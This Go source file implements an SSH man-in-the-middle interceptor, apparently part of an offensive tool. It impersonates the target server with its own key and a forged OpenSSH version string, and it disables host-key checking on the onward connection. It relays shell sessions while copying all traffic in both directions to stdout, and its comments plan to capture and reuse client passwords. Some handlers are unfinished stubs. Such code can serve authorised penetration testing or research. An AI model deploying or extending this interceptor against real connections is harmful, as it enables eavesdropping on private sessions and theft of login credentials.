package mitm

import (
	"context"
	"golang.org/x/crypto/ssh"
	"io"
	"log"
	"net"
	"os"
	"sync"
)

// common client and server things
type sshCommon struct {
	channels <-chan ssh.NewChannel
	requests <-chan *ssh.Request
}

// server specific info
type SSHServer struct {
	sshCommon
	conn *ssh.ServerConn
	conf *ssh.ServerConfig
}

// client specific info
type SSHClient struct {
	sshCommon
	conn ssh.Conn
	conf ssh.ClientConfig
}

// As channel handling is pretty similar for client and server we should join
// it
type sshWhich uint8

const (
	server sshWhich = iota
	client
)

type channelHandler struct {
	channel  ssh.Channel
	requests <-chan *ssh.Request
	which    sshWhich
}

func newchannelHandler(w sshWhich, ch ssh.NewChannel) (*channelHandler, error) {
	hnd := channelHandler{
		which: w,
	}
	//chans, reqs, err := sm.rssh.conn.OpenChannel(name, data)
	return &hnd, nil
}

/*
Monkey in the middle an SSH connection.
The plan:
    - set a private key || generate one on-the-fly
    - probe server for config
    - wait for client, presenting server config
    - use client credentials (if possible) for the server
      ^ obviously public key auth won't work, as we would be out of the loop,
        just proxying encrypted data
    - bidirectionally proxy requests: server <-> client
    - expose some API for listening!
    - profit???

Implements Mitm interface.
*/
type SSHMitm struct {
	// private key
	Key *MonKey

	// internal server connected to the actual client(s) (passed as net.Conn)
	lssh SSHServer
	// internal client connected to the actual server
	rssh SSHClient
	// stop the world
	ctx context.Context
}

type SSHMitmConfig struct {
	ServerPrivKey *MonKey
}

func NewSSHMitm(conf *SSHMitmConfig) Mitm {
	return &SSHMitm{
		Key: conf.ServerPrivKey,
	}
}

// probe the actual server for its configuration
func (sm *SSHMitm) getServerConf(_ net.Conn) (*ssh.ServerConfig, error) {
	//TODO do actually probe for `_` -> `target`
	noauth := ssh.ServerConfig{
		NoClientAuth:  true,
		ServerVersion: "SSH-2.0-OpenSSH 7.4p1 Debian 10+deb9u4",
	}
	noauth.AddHostKey(sm.Key.Signer)
	return &noauth, nil
}

func (sm *SSHMitm) beClient() {
	for {
		select {
		case ch, ok := <-sm.rssh.channels:
			if !ok {
				continue
			}
			sm.serverWantsChannel(ch)
		case rq, ok := <-sm.rssh.requests:
			if !ok {
				continue
			}
			sm.serverRequest(rq)
		case <-sm.ctx.Done():
			return
		}
	}
}

func (sm *SSHMitm) beServer() {
	for {
		select {
		case ch, ok := <-sm.lssh.channels:
			if !ok {
				continue
			}
			sm.clientWantsChannel(ch)
		case rq, ok := <-sm.lssh.requests:
			if !ok {
				continue
			}
			sm.clientRequest(rq)
		case <-sm.ctx.Done():
			return
		}
	}
}

func (sm *SSHMitm) clientWantsChannel(ch ssh.NewChannel) {
	data := ch.ExtraData()[:]
	name := string(data)
	log.Printf("passing channel request '%s' to server", name)

	//FIXME: doing 2 times almost the same..
	//srv := channelHandler{which: server}
	//cli := channelHandler{which: client}

	// pass request to server
	r_chan, r_reqs, r_err := sm.rssh.conn.OpenChannel(name, data)
	if r_err != nil {
		log.Print("lssh-Accept failed: ", r_err)
		ch.Reject(ssh.ConnectionFailed, "packets going astray") // XXX: think of better reason
		return
	}
	defer r_chan.Close()

	// accept client, if server accepts the monkey
	l_chan, l_reqs, l_err := ch.Accept()
	if l_err != nil {
		log.Print("rssh-Accept failed: ", l_err)
		return
	}
	defer l_chan.Close()

	wg := sync.WaitGroup{}
	wg.Add(2)
	go func() {
		defer wg.Done()
		for {
			select {
			case req, ok := <-l_reqs:
				if !ok {
					continue
				}
				switch req.Type {
				case "shell":
					log.Print("requesting shell from rhost")
					ok, err := r_chan.SendRequest(req.Type, req.WantReply, req.Payload)
					if !ok || err != nil {
						log.Printf("no shell | ok: %v err: %v", ok, err)
						req.Reply(false, nil)
						continue
					}
					log.Print("accepting lhost shell request")
					req.Reply(ok, nil)
				default:
					log.Print("rejecting req: ", req.Type)
					req.Reply(false, nil)
				}
			case <-sm.ctx.Done():
				return
			}
		}
	}()
	go func() {
		defer wg.Done()
		for {
			select {
			case req, ok := <-r_reqs:
				if !ok {
					continue
				}
				switch req.Type {
				default:
					log.Print("unhandled server request")
					if req.WantReply {
						req.Reply(false, nil)
					}
				}
			case <-sm.ctx.Done():
				return
			}
		}
	}()

	// listen on both channels stdout+stderr, note that this will douplicate
	// stuff like $PS1 and user-input as both are echo-ed

	lr := io.TeeReader(l_chan, r_chan)
	rl := io.TeeReader(r_chan, l_chan)
	go io.Copy(os.Stdout, lr)
	go io.Copy(os.Stdout, rl)
	lre := io.TeeReader(l_chan.Stderr(), r_chan.Stderr())
	rle := io.TeeReader(r_chan.Stderr(), l_chan.Stderr())
	go io.Copy(os.Stdout, lre)
	go io.Copy(os.Stdout, rle)

	//go io.Copy(r_chan, l_chan)
	//go io.Copy(l_chan, r_chan)

	wg.Wait() // when adding an API here, we must also switch { <-ctx.Done }
}

// TODO
func (sm *SSHMitm) serverWantsChannel(ch ssh.NewChannel) {
	log.Printf("channel request: '%s'", string(ch.ExtraData()[:]))
	ch.Reject(ssh.Prohibited, "TODO")
}

// TODO
func (sm *SSHMitm) clientRequest(rq *ssh.Request) {
	log.Print(rq)
	rq.Reply(false, nil)
}

// TODO
func (sm *SSHMitm) serverRequest(rq *ssh.Request) {
	log.Print(rq)
	rq.Reply(false, nil)
}

/*
Synchronously handle a client connection.

An ssh-client `lhost` wants to connect to an ssh-server `rhost`, and we are
beeing as helpfull as possible!
*/
func (sm *SSHMitm) Mitm(ctx context.Context, lhost, rhost net.Conn) (err error) {
	var (
		lsrv *SSHServer = &sm.lssh
		rcli *SSHClient = &sm.rssh
	)
	if sm.Key == nil {
		log.Print("generating new serverkey, as none was supplied")
		sm.Key, err = NewMonKey()
		if err != nil {
			return
		}
	}

	// ========= so this part is wrong
	// 1. we have to let the client propose config
	// 2. remove stuff that we cannot MITM, e.g. pubkey authentication
	// 3. send client proposal via rcli to the actual server
	// 4. reply via lsrv to the actual client
	// =========
	//
	// extract server config from the actual server
	lsrv.conf, err = sm.getServerConf(rhost)
	if err != nil {
		return
	}

	// connect the actual client
	lsrv.conn, lsrv.channels, lsrv.requests, err = ssh.NewServerConn(lhost, lsrv.conf)
	if err != nil {
		return
	}
	defer lsrv.conn.Close()

	// extract client config from actual client
	rcli.conf = ssh.ClientConfig{
		Config:        lsrv.conf.Config,
		User:          lsrv.conn.User(),
		ClientVersion: lsrv.conf.ServerVersion,
		// I don't care; I'm not the client here!
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	//
	// =========

	//<- // TODO wait for actual client to finish authentication with us, so we
	// know passwords and stuff

	rcli.conn, rcli.channels, rcli.requests, err = ssh.NewClientConn(rhost, "", &rcli.conf)
	if err != nil {
		return
	}
	defer rcli.conn.Close()
	log.Printf("[SSHMitm] +connection from laddr=%v, luser=%s, lver=%v, to raddr=%v, ruser=%s, rver=%v",
		lsrv.conn.RemoteAddr(), lsrv.conn.User(),
		string(lsrv.conn.ClientVersion()[:]),
		rcli.conn.RemoteAddr(), rcli.conn.User(),
		string(rcli.conn.ClientVersion()[:]))

	// ugly piece of shit code, but we should really cancel, if a connection breaks
	var cancel func()
	ctx, cancel = context.WithCancel(ctx)
	go func() {
		log.Printf("[SSHMitm] lssh conn closed: %v", lsrv.conn.Wait())
		cancel()
	}()
	go func() {
		// XXX: could try to reconnect the server, but client would likely notice
		log.Printf("[SSHMitm] rssh conn closed: %v", rcli.conn.Wait())
		cancel()
	}()
	sm.ctx = ctx

	wg := sync.WaitGroup{}
	wg.Add(2)
	// handle the real server
	go func() { sm.beClient(); wg.Done() }()
	// handle the real client
	go func() { sm.beServer(); wg.Done() }()
	// wait for client+server routines
	wg.Wait()
	return nil
}
